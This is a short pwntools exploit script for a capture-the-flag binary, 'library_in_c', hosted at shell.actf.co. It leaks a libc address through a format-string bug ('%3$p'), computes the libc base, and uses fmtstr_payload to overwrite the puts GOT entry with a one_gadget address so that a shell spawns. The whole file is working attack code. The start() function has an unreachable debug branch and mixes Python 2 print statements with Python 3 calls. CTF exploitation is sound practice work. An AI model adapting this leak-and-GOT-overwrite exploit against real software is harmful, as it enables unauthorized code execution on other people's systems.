from pwn import *

BINARY = './library_in_c'
HOST = 'shell.actf.co'
PORT = 20201

elf = ELF('library_in_c')
context.terminal = ['tmux', 'split-window']

def start():
    if not args.REMOTE:
        print "LOCAL PROCESS"
        return process(BINARY, env={"LD_PRELOAD":"./libc.so.6"})
    if not args.REMOTE and args.GDB:
        gdb.attach(process(BINARY))
    else:
        print "REMOTE PROCESS"
        return remote(HOST, PORT)

one_gadget_offset = 0x4526a
libc_base_offset = 0xf72c0

p = start()
if args.GDB:
    gdb.attach(p, 'b *main+247\nb *main+259')

print(p.recvuntil("What is your name?\n"))
p.sendline('%3$p')
result = p.recvline()
print(result)

leak = int(result[16:34], 16) - libc_base_offset
print("Libc base: " + str(hex(leak)))
print("One gadget: " + str(hex(leak + one_gadget_offset) ))

puts = elf.got['puts']
print("puts.got ={}".format(hex(puts)))


print(p.recvline())
#print(p.recvuntil("check out?\n"))
payload = fmtstr_payload(16, {puts: leak + one_gadget_offset},write_size='short')
print(payload)
p.sendline(payload)
print(p.recvuntil("day!"))
